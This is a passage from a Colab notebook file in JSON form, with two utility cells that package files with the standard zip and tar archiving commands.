      "cell_type": "markdown",
      "metadata": {
        "id": "nJym0SziwlTD",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Zip file to .zip"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QjmRzCS_wptC",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! zip -r 'archive.zip' 'stuff1.xxx' 'stuff2.xxx'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "M1Pl8SCIxpAp",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Zip file to .tar.gz"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "loeoQoMGxyXQ",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "tar -czvf archive.tar.gz stuff"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}